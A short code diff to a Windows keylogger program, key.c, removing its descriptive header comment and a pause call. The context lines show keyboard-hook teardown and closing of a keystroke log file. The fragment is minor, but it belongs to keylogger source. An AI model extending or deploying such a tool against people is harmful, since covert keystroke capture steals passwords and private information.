@@ -25,15 +25,6 @@
  * For more information, please refer to <http://unlicense.org/>
  */
 
-//*******************************************************************
-// Program: key.c
-// Source files: key.c
-// Author: Marc-André Moreau
-// Last update: September 18th, 2008
-// Description: Simple keylogger program for Windows, with support
-// for UNICODE, modifier keys and dead characters
-//*******************************************************************
-
 #include "kbd_ext.h"
 
 #include <stdio.h>
@@ -84,8 +75,6 @@ int main(int argc, char* argv[])
 	UnhookWindowsHookEx(hKeyHook);
 	fclose(keylog);
 #endif
-
-	system("pause");
 
 	return 0;
 }
